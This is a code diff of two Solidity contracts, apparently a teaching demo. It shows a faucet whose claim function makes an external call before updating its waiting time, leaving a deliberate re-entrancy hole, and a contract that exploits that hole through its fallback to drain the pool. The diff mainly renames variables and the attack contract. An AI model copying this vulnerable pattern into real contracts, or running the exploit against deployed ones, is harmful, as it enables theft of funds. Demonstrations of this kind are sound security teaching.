@@ -2,7 +2,7 @@
 pragma solidity ^0.8.26;
 
 contract Faucet {
-    uint256 public pool = 10;
+    uint256 public etherPool = 10;
     mapping(address => uint256) public balances;
     mapping(address => uint256) public WaitingTime;
 
@@ -12,9 +12,9 @@ contract Faucet {
             "Waiting Time not expired"
         );
         balances[msg.sender]++;
-        pool--;
+        etherPool--;
 
-        (bool success, ) = msg.sender.call("");
+        (bool success, ) = msg.sender.call(msg.data);
         require(success, "Failed to send Funds");
 
         WaitingTime[msg.sender] = block.timestamp + 1 days;
@@ -25,7 +25,7 @@ contract Faucet {
     }
 }
 
-contract Attack {
+contract ReEntrancy {
     Faucet public faucet;
 
     constructor(address _addr) {
@@ -33,13 +33,13 @@ contract Attack {
     }
 
     fallback() external {
-        if (faucet.pool() > 0) {
+        if (faucet.etherPool() > 0) {
         faucet.claim();
         }
     }
 
     function attack() external payable {
-        require(faucet.pool() > 0);
+        require(faucet.etherPool() > 0);
         faucet.claim();
     }
 }
